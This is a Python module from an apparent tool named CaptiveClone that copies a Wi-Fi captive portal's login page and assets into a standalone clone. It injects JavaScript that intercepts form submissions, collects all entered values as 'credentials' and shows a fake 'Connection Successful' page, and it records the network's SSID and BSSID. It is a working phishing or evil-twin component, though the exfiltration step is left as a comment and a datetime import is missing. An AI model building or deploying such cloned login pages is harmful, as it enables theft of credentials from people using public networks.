"""
Portal Cloner Module for CaptiveClone.

This module is responsible for generating standalone clones of captured portals,
including HTML, CSS, JavaScript, and other assets.
"""

import os
import re
import json
import logging
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Any, Set
import urllib.parse

from bs4 import BeautifulSoup
from jinja2 import Environment, FileSystemLoader

from captiveclone.core.portal_analyzer import PortalAnalyzer, PortalAsset
from captiveclone.core.models import CaptivePortal
from captiveclone.database.models import PortalAsset as DBPortalAsset
from captiveclone.utils.exceptions import CloneGenerationError

logger = logging.getLogger(__name__)

class PortalCloner:
    """Generates standalone clones of captive portals."""
    
    def __init__(self, output_dir: str = "./portal_clones"):
        """
        Initialize the portal cloner.
        
        Args:
            output_dir: Base directory to store cloned portals
        """
        self.output_dir = output_dir
        self.analyzer = PortalAnalyzer()
        self.templates_dir = Path(__file__).parent.parent / "templates"
        
        # Ensure the templates directory exists
        os.makedirs(self.templates_dir, exist_ok=True)
        
        # Initialize Jinja2 environment
        self.jinja_env = Environment(
            loader=FileSystemLoader(str(self.templates_dir)),
            autoescape=True
        )
    
    def clone_portal(self, portal_url: str, output_name: str = None) -> str:
        """
        Clone a captive portal from a URL.
        
        Args:
            portal_url: URL of the captive portal
            output_name: Name for the output directory (defaults to domain name)
            
        Returns:
            Path to the cloned portal
        """
        logger.info(f"Cloning captive portal at URL: {portal_url}")
        
        try:
            # Analyze the portal first
            portal = self.analyzer.analyze_portal(portal_url)
            
            # Determine output name if not provided
            if not output_name:
                output_name = self._extract_domain_name(portal_url)
            
            # Create output directory
            clone_dir = os.path.join(self.output_dir, output_name)
            os.makedirs(clone_dir, exist_ok=True)
            
            # Copy assets to clone directory
            assets_dir = os.path.join(clone_dir, "assets")
            os.makedirs(assets_dir, exist_ok=True)
            self._copy_assets(self.analyzer.assets, clone_dir)
            
            # Create the main HTML file
            index_path = self._generate_html(portal, self.analyzer.assets, clone_dir)
            
            # Create a metadata file
            self._create_metadata(portal, clone_dir)
            
            logger.info(f"Portal clone generated at: {clone_dir}")
            return clone_dir
        
        except Exception as e:
            logger.error(f"Error cloning portal: {str(e)}")
            raise CloneGenerationError(f"Failed to clone portal at {portal_url}: {str(e)}")
    
    def clone_from_database(self, portal_id: int, output_name: str = None) -> str:
        """
        Clone a captive portal from database records.
        
        Args:
            portal_id: ID of the portal in the database
            output_name: Name for the output directory
            
        Returns:
            Path to the cloned portal
        """
        # This method would use data from the database instead of capturing live
        # Implementation would be added when database integration is complete
        pass
    
    def _copy_assets(self, assets: Dict[str, PortalAsset], target_dir: str) -> None:
        """
        Copy all assets to the target directory.
        
        Args:
            assets: Dictionary of assets (URL -> PortalAsset)
            target_dir: Target directory for the clone
        """
        assets_dir = os.path.join(target_dir, "assets")
        os.makedirs(assets_dir, exist_ok=True)
        
        for url, asset in assets.items():
            if asset.local_path and os.path.exists(asset.local_path):
                # Determine subdirectory based on asset type
                subdir = self._get_asset_subdir(asset.asset_type)
                subdir_path = os.path.join(assets_dir, subdir)
                os.makedirs(subdir_path, exist_ok=True)
                
                # Copy the file to the appropriate location
                filename = os.path.basename(asset.local_path)
                target_path = os.path.join(subdir_path, filename)
                shutil.copy2(asset.local_path, target_path)
                
                # Update the asset's local path to the new location
                asset.local_path = os.path.join("assets", subdir, filename)
    
    def _generate_html(self, portal: CaptivePortal, assets: Dict[str, PortalAsset], target_dir: str) -> str:
        """
        Generate the main HTML file for the cloned portal.
        
        Args:
            portal: CaptivePortal object
            assets: Dictionary of assets
            target_dir: Target directory for the clone
            
        Returns:
            Path to the generated HTML file
        """
        # Find the main HTML asset
        html_asset = None
        for url, asset in assets.items():
            if asset.asset_type == 'html':
                html_asset = asset
                break
        
        if not html_asset or not html_asset.content:
            raise CloneGenerationError("Could not find HTML content for the portal")
        
        # Parse HTML
        soup = BeautifulSoup(html_asset.content, 'html.parser')
        
        # Update asset URLs to point to local files
        self._update_asset_urls(soup, assets)
        
        # Add credential capture logic
        self._inject_credential_capture(soup, portal)
        
        # Write the modified HTML to file
        index_path = os.path.join(target_dir, "index.html")
        with open(index_path, 'wb') as f:
            f.write(soup.prettify().encode('utf-8'))
        
        return index_path
    
    def _update_asset_urls(self, soup: BeautifulSoup, assets: Dict[str, PortalAsset]) -> None:
        """
        Update asset URLs in HTML to point to local files.
        
        Args:
            soup: BeautifulSoup object representing the HTML
            assets: Dictionary of assets
        """
        # Update CSS links
        for link in soup.find_all('link', rel='stylesheet'):
            if 'href' in link.attrs:
                href = link['href']
                full_url = urllib.parse.urljoin(self.analyzer.base_url, href)
                if full_url in assets and assets[full_url].local_path:
                    link['href'] = assets[full_url].local_path
        
        # Update script sources
        for script in soup.find_all('script', src=True):
            src = script['src']
            full_url = urllib.parse.urljoin(self.analyzer.base_url, src)
            if full_url in assets and assets[full_url].local_path:
                script['src'] = assets[full_url].local_path
        
        # Update image sources
        for img in soup.find_all('img', src=True):
            src = img['src']
            full_url = urllib.parse.urljoin(self.analyzer.base_url, src)
            if full_url in assets and assets[full_url].local_path:
                img['src'] = assets[full_url].local_path
        
        # Update background images in inline styles
        for tag in soup.find_all(style=True):
            style = tag['style']
            urls = re.findall(r'url\([\'"]?([^\'")]+)[\'"]?\)', style)
            for url in urls:
                full_url = urllib.parse.urljoin(self.analyzer.base_url, url)
                if full_url in assets and assets[full_url].local_path:
                    style = style.replace(f"url({url})", f"url({assets[full_url].local_path})")
            tag['style'] = style
    
    def _inject_credential_capture(self, soup: BeautifulSoup, portal: CaptivePortal) -> None:
        """
        Inject JavaScript to capture form submissions.
        
        Args:
            soup: BeautifulSoup object representing the HTML
            portal: CaptivePortal object
        """
        # Find all forms
        forms = soup.find_all('form')
        if not forms:
            logger.warning("No forms found to inject credential capture")
            return
        
        # Create a script tag for credential capture
        script = soup.new_tag('script')
        script.string = """
        document.addEventListener('DOMContentLoaded', function() {
            var forms = document.querySelectorAll('form');
            forms.forEach(function(form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    // Collect form data
                    var formData = {};
                    var inputs = form.querySelectorAll('input, select, textarea');
                    inputs.forEach(function(input) {
                        if (input.name) {
                            formData[input.name] = input.value;
                        }
                    });
                    
                    // Store credentials
                    console.log('Form data:', formData);
                    
                    // Here you would normally send this data to your server
                    // For the demo, we'll display it and redirect after a delay
                    alert('Thank you! Redirecting to the Internet...');
                    
                    // Redirect to success page
                    setTimeout(function() {
                        window.location.href = 'success.html';
                    }, 1500);
                });
            });
        });
        """
        
        # Add the script to the HTML
        if soup.head:
            soup.head.append(script)
        else:
            soup.append(script)
        
        # Create a success page
        success_script = soup.new_tag('script')
        success_script.string = """
        // Create success page
        const successHtml = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Connection Successful</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    margin-top: 50px;
                }
                .success {
                    color: green;
                    font-size: 24px;
                    margin-bottom: 20px;
                }
                .spinner {
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #3498db;
                    border-radius: 50%;
                    width: 30px;
                    height: 30px;
                    animation: spin 2s linear infinite;
                    margin: 0 auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div class="success">✓ Connection Successful</div>
            <p>You are now connected to the Internet.</p>
            <div class="spinner"></div>
            <p>Redirecting to your destination...</p>
        </body>
        </html>
        `;
        
        // Write success page to file
        const blob = new Blob([successHtml], {type: 'text/html'});
        const a = document.createElement('a');
        a.download = 'success.html';
        a.href = URL.createObjectURL(blob);
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        """
        
        # Add the success page script
        if soup.head:
            soup.head.append(success_script)
        else:
            soup.append(success_script)
    
    def _create_metadata(self, portal: CaptivePortal, target_dir: str) -> None:
        """
        Create a metadata file with information about the cloned portal.
        
        Args:
            portal: CaptivePortal object
            target_dir: Target directory for the clone
        """
        metadata = {
            "portal_url": portal.login_url,
            "requires_authentication": portal.requires_authentication,
            "form_fields": portal.form_fields,
            "network": {
                "ssid": portal.network.ssid,
                "bssid": portal.network.bssid,
                "has_captive_portal": portal.network.has_captive_portal
            },
            "cloned_at": str(datetime.datetime.now())
        }
        
        metadata_path = os.path.join(target_dir, "metadata.json")
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)
    
    def _extract_domain_name(self, url: str) -> str:
        """
        Extract a domain name from a URL.
        
        Args:
            url: URL to extract from
            
        Returns:
            Domain name
        """
        parsed = urllib.parse.urlparse(url)
        domain = parsed.netloc
        
        # Remove port if present
        if ":" in domain:
            domain = domain.split(":")[0]
        
        # Make it suitable for a directory name
        domain = re.sub(r'[^\w\-]', '_', domain)
        
        return domain
    
    def _get_asset_subdir(self, asset_type: str) -> str:
        """
        Get the appropriate subdirectory for an asset type.
        
        Args:
            asset_type: Type of asset ('html', 'css', 'js', 'image', etc.)
            
        Returns:
            Subdirectory name
        """
        type_to_dir = {
            'css': 'css',
            'js': 'js',
            'image': 'images',
            'font': 'fonts',
            'html': 'html',
            'json': 'data'
        }
        
        return type_to_dir.get(asset_type, 'misc') 